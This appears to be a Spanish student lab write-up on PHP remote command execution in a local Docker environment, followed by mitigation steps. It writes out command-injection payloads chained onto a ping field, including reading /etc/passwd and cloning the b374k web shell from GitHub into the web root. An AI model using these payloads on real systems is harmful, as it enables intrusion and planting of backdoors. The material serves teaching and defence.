# PPS-Unidad3Actividad6-AimarMartin

1. Primero escribimos un archivo llamado **rce.php** con el siguiente contenido

![](/img/1.png)

2. Una vez lo hemos añadido a la carpeta de apache lo buscaremos en un navegador

![](/img/2.png)

3. Si hacemos ping a **8.8.8.8** nos dirá si el servidor está accesible

![](/img/3.png)

pero si lo enlazamos con **8.8.8.8 & id** podemos anudar consultas que nos mostraría el usuario con el que estamos ejecutando las sentencias php

![](/img/4.png)

4. Ahora con **8.8.8.8 & ls** intentaremos listar los archivos del directorio donde se encuentra el archivo rce.php con

![](/img/5.png)

5. Vamos a probar que nos muestra con el comando **8.8.8.8 & cat /etc/passwd**

![](/img/6.png)

6. Para el siguiente ejemplo le daremos permisos de lectura y escritura a la carpeta del apache

![](/img/7.png)

7. Introducimos **8.8.8.8 & git clone https://github.com/b374k/b374k.git /var/www/html/b374k** ara concatenar la ip del servidor dns de Google, con descargar el proyecto git b374k

![](/img/8.png)

8. Escribimos **http://localhost/b374k/index.php** en el navegador

![](/img/9.png)

9. Para las mitigación editamos el archivo **rce.php** y añadimos lo siguiente

![](/img/10.png)

10. Escribiremos en el navegador **http://localhost/ejercicio_3_6/rce.php?cmd=cat%20/etc/passwd** y observamos la salida que nos muestra

![](/img/11.png)

11. Por otro lado creamos el archivo **rce.html**

![](/img/12.png)

12. Lo que hace es crearnos un input para solicitarnos el código a ejecutar y luego, llamar con él, a rce.php.

![](/img/13.png)

13. Volvemos a editar el archivo **rce.php** para mitigar vulnerabilidades

![](/img/14.png)

14. Si escribimos **http://localhost/ejercicio_3_6/rce.php?cmd=ls** si nos saldrá la información aun con las restricciones que le hemos puesto anteriormente

![](/img/15.png)

15. Pero no nos permitirá una consulta

![](/img/16.png)

16. Si queremos dejar escapes seguros modificaremos el archivo con el siguiente contenido

![](/img/17.png)

17. Con esto evitaremos caracteres especiales como los siguientes

![](/img/18.png)

18. Entramos en la máquina docker con **docker exec -it lamp-php83 /bin/bash** y editamos el fichero que se encuentra en la ruta **/usr/local/etc/php/php.ini**

![](/img/19.png)

19. Si entramos en la ruta http://localhost/rce.php?cmd=id nos tendrá que dar un error

![](/img/20.png)